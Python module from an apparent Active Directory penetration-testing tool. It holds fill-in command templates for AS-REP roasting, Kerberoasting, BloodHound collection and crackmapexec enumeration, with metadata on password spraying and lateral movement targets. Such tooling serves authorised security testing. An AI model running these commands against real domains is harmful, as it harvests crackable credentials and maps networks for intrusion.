"""
Authenticated user attack mappings for bloodtrail.

Attacks that any authenticated domain user can run (no specific BloodHound edges required).
"""

from typing import Dict, List, Optional


# Templates for attacks that ANY authenticated domain user can run
# These don't require specific BloodHound edges - just valid domain creds
AUTHENTICATED_USER_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        # Credential Attacks (High Priority)
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request",
        # BloodHound Collection
        "bloodhound": "bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>",
        # User/Group Enumeration
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users",
        "enum-groups": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'",
        # Share/Resource Enumeration
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers",
        # Policy/Config Enumeration
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol",
        "enum-gpos": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo",
        "enum-trusts": "crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts",
    },
    "ntlm-hash": {
        "asrep-roast": "impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "kerberoast": "impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request",
        "bloodhound": "bloodhound-python -c all -u <USERNAME> --hashes :<NTLM_HASH> -d <DOMAIN> -dc <DC_IP>",
        "enum-users": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --users",
        "enum-shares": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --shares",
        "enum-computers": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --computers",
        "enum-passpol": "crackmapexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --pass-pol",
    },
    "kerberos-ticket": {
        "asrep-roast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetNPUsers '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP>",
        "kerberoast": "KRB5CCNAME=<CCACHE_FILE> impacket-GetUserSPNs '<DOMAIN>/<USERNAME>' -k -no-pass -dc-ip <DC_IP> -request",
        "bloodhound": "KRB5CCNAME=<CCACHE_FILE> bloodhound-python -c all -u <USERNAME> -k -d <DOMAIN> -dc <DC_IP>",
    },
}

# Attack metadata for display (organized by priority and category)
AUTHENTICATED_ATTACKS: List[Dict[str, str]] = [
    # === CREDENTIAL ATTACKS (High Priority) ===
    {
        "id": "asrep-roast",
        "name": "AS-REP Roasting",
        "category": "Credential Attacks",
        "objective": "Find users with DONT_REQUIRE_PREAUTH, get crackable hash",
        "rewards": "Credentials of AS-REP roastable users",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    {
        "id": "kerberoast",
        "name": "Kerberoasting",
        "category": "Credential Attacks",
        "objective": "Get TGS tickets for service accounts, crack offline",
        "rewards": "Service account credentials (often privileged)",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === BLOODHOUND (Recommended) ===
    {
        "id": "bloodhound",
        "name": "BloodHound Collection",
        "category": "Graph Collection",
        "objective": "Collect domain data for attack path analysis",
        "rewards": "Complete attack path visualization, missed edges",
        "requires": "Any authenticated domain user",
        "priority": "high",
    },
    # === USER/GROUP ENUMERATION ===
    {
        "id": "enum-users",
        "name": "Domain User Enumeration",
        "category": "User Enumeration",
        "objective": "Enumerate all domain users for targeting",
        "rewards": "User list for password spraying, pattern analysis",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-groups",
        "name": "Domain Admins Members",
        "category": "User Enumeration",
        "objective": "Identify Domain Admin group members",
        "rewards": "High-value targets for credential attacks",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === RESOURCE ENUMERATION ===
    {
        "id": "enum-shares",
        "name": "Share Enumeration",
        "category": "Resource Enumeration",
        "objective": "Enumerate accessible SMB shares",
        "rewards": "Sensitive files, credentials, configuration data",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-computers",
        "name": "Computer Enumeration",
        "category": "Resource Enumeration",
        "objective": "List domain computers for lateral movement targets",
        "rewards": "Target list for lateral movement, version info",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    # === POLICY ENUMERATION ===
    {
        "id": "enum-passpol",
        "name": "Password Policy",
        "category": "Policy Enumeration",
        "objective": "Get password policy for spray planning",
        "rewards": "Lockout threshold, complexity, spray parameters",
        "requires": "Any authenticated domain user",
        "priority": "medium",
    },
    {
        "id": "enum-trusts",
        "name": "Domain Trust Enumeration",
        "category": "Policy Enumeration",
        "objective": "Discover domain trusts for cross-domain attacks",
        "rewards": "Trust relationships, potential lateral paths",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
    {
        "id": "enum-gpos",
        "name": "GPO Enumeration",
        "category": "Policy Enumeration",
        "objective": "Enumerate Group Policy Objects",
        "rewards": "GPO misconfigs, deployed software, privilege settings",
        "requires": "Any authenticated domain user",
        "priority": "low",
    },
]


def get_authenticated_attack_template(cred_type: str, attack_id: str) -> Optional[str]:
    """
    Get command template for an authenticated user attack.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket
        attack_id: Attack ID from AUTHENTICATED_ATTACKS

    Returns:
        Command template string or None if not available
    """
    return AUTHENTICATED_USER_TEMPLATES.get(cred_type, {}).get(attack_id)


def get_authenticated_attacks(priority: Optional[str] = None) -> List[Dict[str, str]]:
    """
    Get list of authenticated user attack metadata.

    Args:
        priority: Filter by priority (high, medium, low) or None for all

    Returns:
        List of attack metadata dicts
    """
    if priority is None:
        return AUTHENTICATED_ATTACKS
    return [a for a in AUTHENTICATED_ATTACKS if a.get("priority") == priority]
